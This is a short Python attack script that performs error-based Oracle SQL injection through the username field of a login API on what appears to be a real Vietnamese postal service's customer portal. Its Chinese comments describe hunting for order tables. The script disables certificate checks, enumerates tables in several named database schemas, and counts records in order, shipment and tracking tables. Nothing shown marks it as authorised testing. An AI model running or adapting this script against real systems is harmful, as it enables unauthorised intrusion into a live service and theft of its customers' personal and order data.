#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

url = 'https://customerconnect.ems.com.vn/api/User_Customer/Login'

def sqli(query):
    payload = {
        'Username': f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({query})))||'",
        'Password': 'test'
    }
    resp = requests.post(url, json=payload, verify=False, timeout=15)
    if 'thesaurus' in resp.text:
        start = resp.text.find('thesaurus ') + 10
        end = resp.text.find(' does not', start)
        if end > start:
            return resp.text[start:end]
    return None

print('=== 查找订单表 ===\n')

# 查询各个数据库的订单相关表
databases = ['EMS', 'EMSAPI', 'EMSCOM', 'EMSSERVICE', 'BCCPCOM']

for db in databases:
    print(f'[{db}] 订单表:')
    
    # 查找包含ORDER的表
    for i in range(1, 6):
        result = sqli(f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='{db}' AND (TABLE_NAME LIKE '%ORDER%' OR TABLE_NAME LIKE '%SHIPMENT%' OR TABLE_NAME LIKE '%DONHANG%')) WHERE RN={i}")
        if result:
            # 统计该表的记录数
            count = sqli(f"SELECT COUNT(*) FROM {db}.{result}")
            print(f'  ✓ {result} - 记录数: {count}')
    print()

# 特别查询Swagger中发现的表
print('\n[Swagger相关表]:')
swagger_tables = [
    'SHIPMENT',
    'ORDERS', 
    'ORDER_DETAIL',
    'DELIVERY',
    'TRACKING'
]

for table in swagger_tables:
    count = sqli(f"SELECT COUNT(*) FROM {table}")
    if count:
        print(f'  ✓ {table} - 记录数: {count}')
